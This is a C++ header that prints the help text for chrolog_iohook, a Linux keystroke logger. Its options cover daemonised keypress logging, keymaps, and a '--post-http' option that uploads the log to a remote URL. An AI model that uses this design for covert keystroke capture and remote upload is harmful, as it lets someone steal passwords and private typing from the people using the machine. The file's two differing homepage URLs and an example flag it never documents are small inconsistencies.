/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.

  Project homepage: https://github.com/kernc/chrolog_iohook
*/

#ifndef _USAGE_H_
#define _USAGE_H_

namespace chrolog_iohook
{

  void usage()
  {
    fprintf(stderr,
            "Usage: chrolog_iohook [OPTION]...\n"
            "Log depressed keyboard keys.\n"
            "\n"
            "  -s, --start               start logging keypresses\n"
            "  -m, --keymap=FILE         use keymap FILE\n"
            "  -u, --us-keymap           use en_US keymap instead of configured default\n"
            "  -k, --kill                kill running chrolog_iohook process\n"
            "  -d, --device=FILE         input event device [eventX from " INPUT_EVENT_PATH "]\n"
            "  -?, --help                print this help screen\n"
            "      --export-keymap=FILE  export configured keymap to FILE and exit\n"
            "      --no-func-keys        log only character keys\n"
            "      --no-timestamps       don't prepend timestamps to log file lines\n"
            "      --timestamp-every     log timestamp on every keystroke\n"
            "      --post-http=URL       POST log to URL as multipart/form-data file\n"
            //"      --post-irc=FORMAT     FORMAT is nick_or_channel@server:port\n"
            "      --post-size=SIZE      post log file when size equals SIZE [500k]\n"
            "      --no-daemon           run in foreground\n"
            "\n"
            "Examples: chrolog_iohook -s -m mylang.map -o ~/.secret-keys.log\n"
            "          chrolog_iohook -s -d event6\n"
            "          chrolog_iohook -k\n"
            "\n"
            "chrolog_iohook version: " PACKAGE_VERSION "\n"
            "chrolog_iohook homepage: <https://github.com/lukylix/chrolog_iohook/>\n");
  }

} // namespace chrolog_iohook

#endif // _USAGE_H_
